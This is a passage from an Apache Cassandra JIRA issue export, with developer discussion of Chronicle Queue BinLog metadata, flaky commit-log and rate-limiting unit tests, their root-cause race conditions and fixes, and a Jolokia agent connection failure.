20221005-102939T.cq4 <-- listing.highestCycle
metadata.cq4t - <-- listing.modCount: 3 because there are three files
{code}
If we add one more file / cycle, modCount will be 4 and listing.highestCycle will change its value (lowestCycle is unchanged).

I played with various scenarios:

1) Imagine there is 10 cq4 + metadata and I remove metadata.cq4t. When BinLog starts, it will create new metadata file and it starts to create new log files. Lets say that it will create 5 logs while it runs. After dumping the metadata file, listing.lowestCycle will have timestamp of the oldest file, listing.highestCycle will have timestamp of the newest file, but, and this is interesting, listing.modCount will be ""5"" again, not 15.

In other words, when new metadata is created, it will take into account lowest and highest timestamps of ALL files in the log dir, but listing.modCount of new metadata file will be equal to the number of newly allocated files, not the number of old files PLUS new ones. New metadata starts to count from 0 and it does not take into account any previous logs even though it takes into account their lowest and timestamp.

2) If I remove the files between lowest and highest cycles, there is a ""hole"" in files, but metadata file do not care. Only modCount will not be the correct anymore.

It seems to me that after I dumped all logs, even numbers in metadata were not aligned, it did not matter. It just dumped the content of the logs. It will dump them without metadata being present at all, actually.

When I put an empty file into log dir and started Cassandra, it failed, but I was testing if empty file will increase modCount field in metadata.cq4t file - and it did not. It was still 3 even I manufactured empty, fourth file. After dumping metadata, it was not 4 but still 3.

If there were legit 4 files in the log dir and modCount was 4 and I stopped Cassandra, removed fourth file and touched an empty one, it failed to start Cassandra. If I removed that empty file by hand and started Cassandra again, it increased the counter in metadata.cq4t to 5 even though there are 4 files.

All of this tells me that it is quite harmless to remove empty files and keep metadata there.  The only issue so far I see is that lowestCycle and highestCycle are updated dynamically based on what it finds on the disk upon start (and updating it as it creates new files), however might happen that modCount will not reflect reality anymore.

(1) [https://github.com/OpenHFT/Chronicle-Queue/blob/ea/src/main/java/net/openhft/chronicle/queue/main/DumpMain.java];;;","05/Oct/22 16:04;maedhroz;Thanks for the thorough investigation around that. Agreed that the relationship between the metadata and actual files seems flexible enough. I should be able to approve once you've addressed the [handful of comments|https://github.com/apache/cassandra/pull/1894/files] one way or the other. Thanks!;;;","07/Oct/22 15:38;maedhroz;+1 on the 4.0 PR;;;","08/Oct/22 15:53;smiklosovic;trunk [https://app.circleci.com/pipelines/github/instaclustr/cassandra?branch=CASSANDRA-17933-trunk]
4.1 [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1989]
4.0 [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1987]

https://github.com/instaclustr/cassandra/tree/CASSANDRA-17933-4.0
https://github.com/instaclustr/cassandra/tree/CASSANDRA-17933-4.1
https://github.com/instaclustr/cassandra/tree/CASSANDRA-17933-trunk;;;","08/Oct/22 16:19;smiklosovic;Based no the build, I moved this to ready to commit, feel free to skim through it though.;;;","10/Oct/22 16:15;maedhroz;[~smiklosovic] The original 4.0 PR and the 4.1 and trunk branches LGTM, so +1 overall, but what is [https://github.com/instaclustr/cassandra/commits/CASSANDRA-17933-4.0]? ;;;","10/Oct/22 17:37;miklosovic@pm.me;that is probably some leftover from times I was rebasing stuff, no worries. Same thing just called differently.


Sent from ProtonMail mobile



\;;;","10/Oct/22 20:20;maedhroz;[~smiklosovic] Cool. As long as the 4.1/trunk branches and the original 4.0 PR are what's being committed, +1;;;","11/Oct/22 09:05;smiklosovic;I have added 500x run on the added junit here (1)

https://app.circleci.com/pipelines/github/instaclustr/cassandra/1404/workflows/c28c0994-6bca-47f4-961d-8aab18c6dfef/jobs/6192;;;","11/Oct/22 19:06;adhogg;> By the way, we do not know what has caused the creation of that empty file we try to delete. That bothers me too.

I've checked back on the logs provided to try get some more information on what happened, but it's not a very helpful error. The node went down in a non-graceful manner from a Java OOM - with the cause of that not being clear.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.db.commitlog.CommitLogInitWithExceptionTest.testCommitLogInitWithException-compression,CASSANDRA-17928,13483481,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,jmckenzie,jmckenzie,27/Sep/22 15:20,22/Nov/22 15:42,13/Jul/23 08:40,09/Nov/22 18:03,4.0.8,4.1,4.1-rc1,5.0,,,Test/unit,,,,0,,"[Link|https://ci-cassandra.apache.org/job/Cassandra-4.1/169/testReport/org.apache.cassandra.db.commitlog/CommitLogInitWithExceptionTest/testCommitLogInitWithException_compression/]

Failed 1 times in the last 14 runs. Flakiness: 7%, Stability: 92%

Stacktrace
{code:java}
java.lang.NullPointerException
	at org.apache.cassandra.db.commitlog.CommitLogInitWithExceptionTest.testCommitLogInitWithException(CommitLogInitWithExceptionTest.java:93)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base/java.lang.Thread.run(Thread.java:829)
{code}



{code:java}
Standard Output
INFO  [main] 2022-09-25 11:43:16,512 Reflections.java:219 - Reflections took 1221 ms to scan 8 urls, producing 1756 keys and 6922 values
INFO  [main] 2022-09-25 11:43:17,480 Reflections.java:219 - Reflections took 907 ms to scan 8 urls, producing 1756 keys and 6922 values
INFO  [main] 2022-09-25 11:43:17,573 YamlConfigurationLoader.java:104 - Configuration location: file:////home/cassandra/cassandra/build/test/cassandra.compressed.yaml
DEBUG [main] 2022-09-25 11:43:17,574 YamlConfigurationLoader
...[truncated 35568 chars]...
.apache.cassandra.db.commitlog.CommitLogInitWithExceptionTest$MockCommitLogSegmentMgr.createSegment(CommitLogInitWithExceptionTest.java:106)
	at org.apache.cassandra.db.commitlog.AbstractCommitLogSegmentManager$AllocatorRunnable.run(AbstractCommitLogSegmentManager.java:155)
	at org.apache.cassandra.concurrent.InfiniteLoopExecutor.loop(InfiniteLoopExecutor.java:121)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.lang.Thread.run(Thread.java:748)
{code}
",,adelapena,benedict,bereng,e.dimitrova,jmckenzie,jwest,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16925,CASSANDRA-16924,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17995,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Nov 09 18:01:51 UTC 2022,,,,,,,All,,,,"0|z18w00:",9223372036854775807,,,,adelapena,bereng,,,Normal,,4.0-alpha3,,https://github.com/apache/cassandra/commit/70478a1578fe4facb0f59fcb40529e0a4040ac81,,,,,,,,,run CI,,,,,"27/Sep/22 22:55;e.dimitrova;As the test exists in 4.0, I tried to reproduce the failure in both 4.0 and 4.1
Managed to reproduce it when run with compression twice in 5000 times:
 - [https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1964/workflows/de6b4aa9-0a50-4488-b8fd-5e0da2718507/jobs/15521/tests#failed-test-0]
But I didn't manage in 10 000 runs on 4.0 - [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1966/workflows/d616e242-28f3-46d0-b345-30faf2f3ec24], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1966/workflows/38a3ca64-97fe-4477-a05d-3aed705131b1]

Just with the regular _ant testsome_ target I didn't manage to reproduce it 5000 times on both branches. ;;;","13/Oct/22 08:20;bereng;[~e.dimitrova] I've looked at all static inits and everything looks fine iiuc. The test can be ran locally with the {{RepeatableRunner}} but it won't repro and I didn't either by trying several things. All things considered I think this is probably some test env corner case and we can send it to RC and move it out of Beta imo. Wdyt?;;;","13/Oct/22 10:23;bereng;I did try a 5K run with a few added asserts and test-compression and it didn't repro https://app.circleci.com/pipelines/github/bereng/cassandra/794/workflows/d643f1c8-e5b8-4e59-bfbf-63551e7018af/jobs/7228/parallel-runs/21?filterBy=ALL #justfyi;;;","13/Oct/22 11:11;adelapena;I did manage to reproduce the issue on 4.1 with Java 11 and without compression: [https://app.circleci.com/pipelines/github/adelapena/cassandra/2210/workflows/e2b62218-cfa4-4003-a946-c1823931bf64/jobs/22360]

There are two hits in 10K iterations:
{code}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=testsome \
  -e REPEATED_UTEST_COUNT=10000 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.db.commitlog.CommitLogInitWithExceptionTest
{code}
So it seems that compression isn't the issue, and probably we will need more iterations to be sure of hitting it.;;;","18/Oct/22 21:24;e.dimitrova;[~bereng] I didn't have the chance to work on this one, I only pushed repeated runs before I went off so we can see on which branches it fails, whether it is regression, etc. That is why I also didn't assign it as I am not actively working on it or familiar with the test.

With that said I wouldn't advocate for closing it as environmental issue without explanation just because it is hard to reproduce. We have a bunch of examples of legitimate bugs fixed from tests that were super rarely failing. But as I said, I don't know the details in this case so I will leave the decision to whoever assigns it and spends the time to figure out the details.

Whether this is a beta/rc blocker I don't know. I think it was Josh assigning version here when opening the ticket.;;;","18/Oct/22 22:01;brandon.williams;bq. Whether this is a beta/rc blocker I don't know.

This was one of the tickets excepted on the ML with a waiver, given that it was fixed in the next release, so blocking RC on this.;;;","18/Oct/22 23:00;e.dimitrova;{quote}This was one of the tickets excepted on the ML with a waiver, given that it was fixed in the next release, so blocking RC on this.
{quote}
You are right as usual :) Thanks!;;;","19/Oct/22 11:51;bereng;I did run it [today|https://app.circleci.com/pipelines/github/bereng/cassandra/796/workflows/be470790-e5bc-4fe7-97bc-bc2aaff554d1] 5K times on circle but I had decorated the test with the RepeatableRunner with 5K runs. So that is 5K*5K runs trying to assert where the null in {{CommitLog.instance.segmentManager.executor.isTerminated()}} exactly was an it didn't fail meh...;;;","19/Oct/22 13:58;e.dimitrova;The good news are that [~adelapena] reproduced it and the logs are available in CircleCI;;;","19/Oct/22 21:59;brandon.williams;I caught one in [this run|https://app.circleci.com/pipelines/github/driftx/cassandra/673/workflows/6235dcf9-6a8e-4308-adfa-7b60299bb72f/jobs/7492] with [this patch|https://github.com/driftx/cassandra/commit/52bbf68c55d8eb2ea2eb8eb47ca07d96a72389c8] which indicates the executor is what is null... perhaps it's already gone.;;;","20/Oct/22 04:54;bereng;{quote}I caught one in this run with this patch which indicates the executor is what is null... perhaps it's already gone.{quote}

Ah good this is what I was trying to get
;;;","25/Oct/22 15:36;brandon.williams;I removed the 1000ms sleep in favor of awaiting termination on the executor [here|https://github.com/driftx/cassandra/commit/6d7b2aff20c8b3113fef72b186f2caadd39b3aeb].

||Branch||CI||
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17928]|[circle 10k|https://app.circleci.com/pipelines/github/driftx/cassandra/679/workflows/45d0f69d-e99d-4f2b-b69c-af4ad7f8be18/jobs/7504]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17928-trunk]|[circle 10k|https://app.circleci.com/pipelines/github/driftx/cassandra/680/workflows/51868e19-35d1-46fc-af02-9ec6f85bddd0/jobs/7506]

;;;","25/Oct/22 16:24;adelapena;The patch looks good to me. I have started another pair of repeated runs for [4.1|https://app.circleci.com/pipelines/github/adelapena/cassandra/2328/workflows/50f33d9b-c7c6-4aa9-bac9-22ac78ad6b8c]  and [trunk|https://app.circleci.com/pipelines/github/adelapena/cassandra/2327/workflows/aa732ff3-304b-4f0d-ab3c-4662f0a9ebe2] since this one is hard to reproduce.

I think that [the test also exists in 4.0|https://github.com/apache/cassandra/blob/cassandra-4.0/test/unit/org/apache/cassandra/db/commitlog/CommitLogInitWithExceptionTest.java#L84-L93], although in that branch the thread is not wrapped. Should we port the fix, or the test doesn't fail in that branch?;;;","25/Oct/22 16:29;brandon.williams;I don't think it fails on 4.0, but we can see when it finishes [here|https://app.circleci.com/pipelines/github/driftx/cassandra/682/workflows/69d0d7ac-52bc-4f81-b7cd-fdfe7a75c2b7].;;;","25/Oct/22 17:31;adelapena;It seems that the run for 4.1 has hit a NPE: https://app.circleci.com/pipelines/github/adelapena/cassandra/2328/workflows/50f33d9b-c7c6-4aa9-bac9-22ac78ad6b8c/jobs/23224;;;","25/Oct/22 18:38;adelapena;The run for 4.0 also hits a failure, but this time not a NPE but an assertion error, probably due to a slow run: https://app.circleci.com/pipelines/github/driftx/cassandra/682/workflows/69d0d7ac-52bc-4f81-b7cd-fdfe7a75c2b7/jobs/7508/tests;;;","25/Oct/22 18:42;brandon.williams;bq. The run for 4.0 also hits a failure, but this time not a NPE but an assertion error, probably due to a slow run

Incidentally the await patch should solve this, but we're still left with the mysterious NPE in 4.1.;;;","25/Oct/22 19:03;e.dimitrova;That might explain why I hit it easier in 4.1 than 4.0 :( ;;;","26/Oct/22 05:34;bereng;Yep I had tried that approach to no avail as well. I am at a loss here as following the code, even trying to follow futures execution, etc I can't see where the hole is...;;;","26/Oct/22 10:02;bereng;Ohhhh we're accessing CommitLog init in a multi-threaded way mixing static and non-static monitors. Hence data visibility and reordering are not warrantied. I pushed a proposal to see if that theory is right [here|https://github.com/bereng/cassandra/commit/718f831e6de0b0b88802018d5112fb7d3fe2cf40] with [10K CI|https://app.circleci.com/pipelines/github/bereng/cassandra/800/workflows/5dd074e9-051a-4cd0-bf28-00d84257cb67] running.

[~adelapena] it might be my fault or me being an idiot but
- I run generate.sh and it barfs all tests. We don't seem to have a simple way to bring up the help/usage instructions
- I run it with -m and it barfs all tests
- I run {{./generate.sh -m -e REPEATED_ANT_TEST_TARGET=test -e REPEATED_ANT_TEST_CLASS=CommitLogInitWithExceptionTest -e REPEATED_ANT_TEST_COUNT=10000 -e REPEATED_TESTS_STOP_ON_FAILURE=true}} and the config went empty but for the header of comments;;;","26/Oct/22 10:59;adelapena;That command, {{{}./generate.sh -m -e REPEATED_ANT_TEST_TARGET=test -e REPEATED_ANT_TEST_CLASS=CommitLogInitWithExceptionTest -e REPEATED_ANT_TEST_COUNT=10000 -e REPEATED_TESTS_STOP_ON_FAILURE=true{}}}, works for me.

Did you had any previous changes in {{config-2_1.yml}} that could have confused the script? What's is the output of that command? What version on {{circleci}} CLI tool are you using?

By the way, you can also use:
{code:java}
./generate.sh -m \
  -e REPEATED_UTESTS=org.apache.cassandra.db.commitlog.CommitLogInitWithExceptionTest \
  -e REPEATED_UTESTS_COUNT=10000 \
  -e REPEATED_TESTS_STOP_ON_FAILURE=true
{code}
That should create separate jobs for running the test with default config, compression, tries and system keyspace directories.;;;","26/Oct/22 11:11;bereng;I'll try update the circleci when I have a gap...;;;","26/Oct/22 11:15;adelapena;{quote}I run generate.sh and it barfs all tests. We don't seem to have a simple way to bring up the help/usage instructions
{quote}
That's a bug, calling the script without options should print the help and exit without doing anything else. I'll open a ticket to fix it.;;;","26/Oct/22 11:23;adelapena;Opened CASSANDRA-17995 for fixing the issue when calling without options.;;;","27/Oct/22 10:10;bereng;Well [this|https://github.com/apache/cassandra/compare/trunk...bereng:cassandra:CASSANDRA-17928-4.1] passes [10K|https://app.circleci.com/pipelines/github/bereng/cassandra/801/workflows/67a01d5c-5000-485a-9499-30565122afa1]. If we add the previous 10K runs that is 20K runs without a NPE.

The problem is that the static init on exit and the Thread.join should both warranty a happens-before with a memory barrier that should make all properly visible across threads. The only exception would be another class loader triggering the static init a second time. So I still don't understand who is shuffling things under our feet for the executor to be null.;;;","27/Oct/22 14:55;brandon.williams;I think this is still going to fail due to the awaitTermination call, where mine NPE'd ultimately in that same spot, but we shouldn't need that or the sleep if we spin wait.
Like [this|https://github.com/driftx/cassandra/commit/2d8c09678cb1f18c8103cabce1c07073dd435980] which is running 30k [here|https://app.circleci.com/pipelines/github/driftx/cassandra/684/workflows/7de84fef-0c04-49ee-9239-bdf88ddefd47/jobs/7510].;;;","27/Oct/22 19:45;brandon.williams;The spin wait timed out on 8 of those runs. :(;;;","28/Oct/22 06:49;bereng;The spin wait timing out makes no sense as the exception should have terminated it. But neither does the NPE. Hence my suspicion sbd is shuffling things under our feet. Ofc I just added some debug and now everything passes :facepalm:;;;","31/Oct/22 20:18;brandon.williams;bq. Incidentally the await patch should solve this

Let's prove this out to make sure we understand everything on the 4.0 side.  We don't have the await method there but we can spin wait instead, which I did [here|https://github.com/driftx/cassandra/commit/cd2b04386fe4f22c0aff8ee32766df0b3200cb99].  Indeed, this passed [30k runs|https://app.circleci.com/pipelines/github/driftx/cassandra/686/workflows/3bc04364-b829-48ca-9e33-246899546db2/jobs/7514], where the equivalent in 4.1 previously did not.  The only commit against the test since 4.0 is CASSANDRA-16925, which is in line with the nature of the problem.;;;","03/Nov/22 10:37;adelapena;Some archaeology shows that:
 * The test consistently passed right before CASSANDRA-16924, at commit [2e2db4dc40c4935305b9a2d5d271580e96dabe42|https://github.com/apache/cassandra/commit/2e2db4dc40c4935305b9a2d5d271580e96dabe42]. CI [here|https://app.circleci.com/pipelines/github/adelapena/cassandra/2388/workflows/3f5e6b23-9e7c-46fc-bc15-88492e06bd02].
 * The test started to fail with a timeout at the call to {{initThread.join()}} after CASSANDRA-16924. However, the NPE wasn't hit back then. CI [here|https://app.circleci.com/pipelines/github/adelapena/cassandra/2387/workflows/6a003922-6bdc-4591-8e36-244982511b89].
 * The NPE started to appear with CASSANDRA-16925, together with the same timeout in {{{}initThread.join(){}}}. That was committed immediately after CASSANDRA-16924. CI [here|https://app.circleci.com/pipelines/github/adelapena/cassandra/2389/workflows/7a5fa11b-a79b-428b-a8d0-5e5439c5b979].

So it seems that both CASSANDRA-16924 and CASSANDRA-16925 broke the test, and the NPE comes from the latter.

Maybe [~benedict] or [~samt] can give some insights on this.;;;","03/Nov/22 11:23;benedict;It looks like the problem is that the {{CommitLogSegmentManager}} assigns its {{executor}} variable after {{InfiniteLoopExecutor}} starts its thread, which may therefore process the exception immediately (i.e. before the executor is made visible via {{executor}}). Since the custom JVMKiller kills the thread that is starting the commit log, and this causes abnormal termination of the thread, this can prevent the field from being assigned entirely.

Why is this thread being killed here, though? This is not semantically equivalent to any execution that is possible in a normal system.

Who authored the test, perhaps their insight can be sought as to what the intention was?;;;","03/Nov/22 11:32;brandon.williams;This test was added in CASSANDRA-15295.;;;","03/Nov/22 12:14;benedict;So it is not expressly discussed in that ticket, but AFAICT there is no reason to invoke {{Thread.stop}} in the JVMKiller. Since the real JVMKiller does not invoke Thread.stop this cannot be a critical part of the test. So a simple condition that is signalled by the JVMKiller, that the test waits on for some predetermined period (perhaps 10s) to confirm the JVMKiller has been invoked seems sufficient.

However, it might be nice to confirm with the original authors [~gzh1992n], [~djoshi], [~jwest];;;","07/Nov/22 18:58;jwest;[~benedict] unfortunately its been long enough I've lost the context. Giving it a quick read it seems like the goal is the clean up a resource the test created (I suppose it could also do this by marking the thread as a daemon instead);;;","08/Nov/22 00:13;brandon.williams;bq. So a simple condition that is signalled by the JVMKiller, that the test waits on for some predetermined period (perhaps 10s) to confirm the JVMKiller has been invoked seems sufficient.

About like [this?|https://github.com/driftx/cassandra/commit/6b448fa9ccef58d9116d39a48444afb37594fa20]  Circle [passes 30k|https://app.circleci.com/pipelines/github/driftx/cassandra/692/workflows/28d800ad-9f19-4853-a8d8-88c2c20dbb6e/jobs/7522] iterations.;;;","08/Nov/22 08:23;bereng;^Mmmm I like it;;;","08/Nov/22 14:26;brandon.williams;I ported this to 4.0 as well.  CI is still running.

||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17928-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/696/workflows/97f32020-fc41-45ce-b8d4-a0e4cdfed84d], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/696/workflows/0b4f6404-3cb0-41ef-878b-0def1b845d2f]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17928]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/701/workflows/a1093b26-9c80-455a-871c-da9493642571], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/692/workflows/7029bce2-ed30-4b93-831e-1efd831fc00f]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17928-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/698/workflows/a65d9619-106f-449d-8cd3-1e4b9eba423e], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/697/workflows/13882701-c4ac-48a1-bff7-27dc7d9c58f8]|
;;;","08/Nov/22 17:30;adelapena;The workaround looks good, +1 if it survives the run.

Nit: {{initThread}} can be a local variable now that is not used in {{setUp}} anymore.

Tip: For trunk or any other additional run, if you rebase the branches you can benefit from CASSANDRA-18000 to get faster repeated runs.;;;","09/Nov/22 05:40;bereng;[~brandon.williams] sthg went south in circle bc we have 30K runs on 4.0 where it was already passing. The 4.1 run only has 500 repeats which is not enough and trunk has no repeats at all. I would suggest rebasing for CASSANDRA-18000 as well and do 30K repeats for 4.1 and trunk. Did I miss anything?;;;","09/Nov/22 10:52;adelapena;I've rebased the patches and started new runs:
||Branch||CI||
|[4.1 |https://github.com/adelapena/cassandra/tree/17928-4.1-review]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2478/workflows/b1f45dd7-6f5b-45f5-806c-8d1e3ed907ae] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2478/workflows/64e494ba-c496-40f1-9cf5-cf3e54869b7f]|
|[trunk|https://github.com/adelapena/cassandra/tree/17928-trunk-review]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2479/workflows/1876a5e6-5d4b-4f63-b8db-37abe426c9b6] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2479/workflows/e2701326-7fe8-4929-85b0-ccc84e35b0af]|

The config is generated with:
{code:java}
.circleci/generate.sh -m -e REPEATED_UTESTS_COUNT=30000
{code}
I have also taken the liberty of increasing the spin timeout to 30s instead of 10s, since I am afraid that with so many iterations we could hit an unusually long execution.;;;","09/Nov/22 13:34;bereng;Looks like we hit that unusual long execution even at 30s;;;","09/Nov/22 14:37;adelapena;Trying with a higher timeout [here|https://app.circleci.com/pipelines/github/adelapena/cassandra/2484/workflows/7db9a37e-9866-4d6b-9445-3c5e1e751047].;;;","09/Nov/22 16:58;brandon.williams;That passed, should we go ahead with that timeout?;;;","09/Nov/22 17:21;adelapena;Yes, I think we can go ahead with the 2min timeout.

I've also run j11 and trunk with the increased timeout and all of them pass:
||Branch||CI||
|[4.1 |https://github.com/adelapena/cassandra/tree/17928-4.1-review]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2484/workflows/7db9a37e-9866-4d6b-9445-3c5e1e751047] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2484/workflows/4cc51390-8680-4638-a27c-81feb36b73e7]|
|[trunk|https://github.com/adelapena/cassandra/tree/17928-trunk-review]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2486/workflows/3796fc67-ecfd-4e06-90cc-0751768cec25] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2486/workflows/77e044a2-dde3-47ef-ac69-a36c4aca2153]|

30K iterations per config and branch is a lot of iterations. That increases our chances of hitting both timeouts and races. I guess that seeing that the test doesn't fail anymore when we increase the max wait time discards the possibility of an unknown race. I suspect that most tests using {{spinAssertEquals}} with a shorter timeout would also fail if we run them with such a high number of iterations.;;;","09/Nov/22 18:01;brandon.williams;bq. 30K iterations per config and branch is a lot of iterations

bq. I suspect that most tests using spinAssertEquals with a shorter timeout would also fail if we run them with such a high number of iterations.

I suspect so too, but that may just be the point where you are statistically bound to get bitten by an environmental problem.

Committed with the timeout changed to 120s.

;;;",,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.transport.RateLimitingTest.shouldThrowOnOverloadSmallMessages[4/v4]-cdc ,CASSANDRA-17927,13483480,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,jmckenzie,jmckenzie,27/Sep/22 15:20,06/Oct/22 17:34,13/Jul/23 08:40,05/Oct/22 19:24,4.1,4.1-rc1,5.0,,,,Test/unit,,,,0,,"[Link|https://ci-cassandra.apache.org/job/Cassandra-4.1/169/testReport/org.apache.cassandra.transport/RateLimitingTest/shouldThrowOnOverloadSmallMessages_4_v4__cdc/]

Failed 1 times in the last 30 runs. Flakiness: 6%, Stability: 96%

Error Message
expected:<0> but was:<316>

StackTrace
{code:java}
junit.framework.AssertionFailedError: expected:<0> but was:<316>
	at org.apache.cassandra.transport.RateLimitingTest.testOverload(RateLimitingTest.java:198)
	at org.apache.cassandra.transport.RateLimitingTest.shouldThrowOnOverloadSmallMessages(RateLimitingTest.java:111)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{code}",,e.dimitrova,jmckenzie,maedhroz,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Oct 05 19:24:36 UTC 2022,,,,,,,All,,,,"0|z18vzs:",9223372036854775807,,,,brandon.williams,,,,Low,,4.1-alpha1,,https://github.com/apache/cassandra/commit/8419fb21e016389f15be0954e8721cf4f6918249,,,,,,,,,This is a fix to an existing test.,,,,,"04/Oct/22 21:37;maedhroz;The message size for this test is 250 bytes, so I think there's a random totally unrelated message sneaking into the timeline here. I had no luck reproducing locally, so hitting up the multiplexer...;;;","04/Oct/22 22:24;maedhroz;I spoke too soon. The actual payload size ends up being 316 bytes for user messages of 250 bytes, so this is a race between the assertion that usage has fallen back to zero and the actual release.;;;","04/Oct/22 23:01;maedhroz;It looks like the legacy native protocol server logic doesn't guarantee that the bytes-in-flight release occurs before client response. (See {{PreV5Handlers.LegacyDispatchHandler.releaseItem()}}) I've just adjusted that assumption in the test. Multiplexer run in progress...

|4.1|[patch|https://github.com/apache/cassandra/pull/1898]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17927-4.1]|
|trunk|[patch|https://github.com/apache/cassandra/pull/1901]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17927-trunk]|;;;","05/Oct/22 11:14;brandon.williams;+1;;;","05/Oct/22 17:12;maedhroz;Trunk multiplexer runs are good. Staring commit shortly...;;;","05/Oct/22 19:24;maedhroz;Committed.

4.1 - [https://github.com/apache/cassandra/commit/8419fb21e016389f15be0954e8721cf4f6918249]

trunk - [https://github.com/apache/cassandra/commit/3d0bf61d435b6bdcbf4728f289162afbcaf6c300];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Jolokia agent fails to connect though port is available,CASSANDRA-17922,13483271,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,26/Sep/22 19:49,24/Oct/22 13:40,13/Jul/23 08:40,24/Oct/22 13:40,4.0.8,4.1-rc1,5.0,,,,Build,,,,0,,"In CASSANDRA-17872 we added protection around failures similar to this, caused by the port being in use, which is no longer the case:

{code}
subprocess.CalledProcessError: Command '('/usr/lib/jvm/java-8-openjdk-amd64/bin/java', '{-}cp', '/usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandra/cassandra/cassandra-dtest/tools/../lib/jolokia-jvm-1.7.1-agent.jar', 'org.jolokia.jvmagent.client.AgentLauncher', '{-}{-}host', '127.0.0.2', '{-}-port', '8778', 'start', '1123')' returned non-zero exit status 1.
{code}

